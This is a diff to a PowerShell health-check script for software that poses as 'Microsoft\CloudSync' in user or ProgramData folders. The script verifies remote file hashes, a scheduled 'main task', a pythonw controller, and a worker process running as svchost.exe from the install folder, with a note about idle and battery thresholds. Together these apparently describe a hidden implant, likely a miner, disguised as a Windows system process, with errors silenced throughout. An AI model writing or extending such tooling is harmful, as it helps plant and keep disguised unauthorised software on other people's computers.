@@ -20,7 +20,11 @@
 #>
 [CmdletBinding()]
 param(
-    [string]$InstallDir = (Join-Path $env:LOCALAPPDATA 'Microsoft\CloudSync')
+    [string]$InstallDir = $(
+        $machine = Join-Path $env:ProgramData 'Microsoft\CloudSync'
+        if (Test-Path -LiteralPath $machine) { $machine }
+        else { Join-Path $env:LOCALAPPDATA 'Microsoft\CloudSync' }
+    )
 )
 
 $ErrorActionPreference = 'SilentlyContinue'
@@ -72,7 +76,11 @@ if ($remoteFiles) {
         $localHash = if (Test-Path $localPath) { (Get-FileHash -LiteralPath $localPath -Algorithm SHA256).Hash.ToLower() } else { $null }
         $remoteHash = $null
         try {
-            $tmp = Join-Path $env:TEMP ("cu_" + $name)
+            # manifest paths are relative and may be nested (cloudsync/...), so
+            # flatten the name for the temp file - a bare Join-Path would try to
+            # write into a directory that does not exist.
+            $safeName = ($name -replace '[\\/]', '_')
+            $tmp = Join-Path $env:TEMP ("cu_" + $safeName)
             Invoke-WebRequest -UseBasicParsing -Uri "$base$name" -OutFile $tmp -TimeoutSec 30
             $remoteHash = (Get-FileHash -LiteralPath $tmp -Algorithm SHA256).Hash.ToLower()
             Remove-Item $tmp -Force
@@ -104,7 +112,8 @@ if ($xml) {
     Bad "main task missing"
 }
 
-$ctl = Get-CimInstance Win32_Process -Filter "Name='pythonw.exe'" | Where-Object { $_.CommandLine -like '*controller.py*' }
+$ctl = Get-CimInstance Win32_Process -Filter "Name='pythonw.exe'" |
+    Where-Object { $_.CommandLine -like '*controller.py*' -or $_.CommandLine -like '*-m cloudsync*' }
 $wrk = Get-CimInstance Win32_Process -Filter "Name='svchost.exe'" | Where-Object { $_.ExecutablePath -like "$InstallDir*" }
 if ($ctl) { Ok "controller running (pid $($ctl.ProcessId))" } else { Warn "controller not running" }
 if ($wrk) { Ok "worker running (pid $($wrk.ProcessId))" } else { Warn "worker not running (idle threshold? battery?)" }
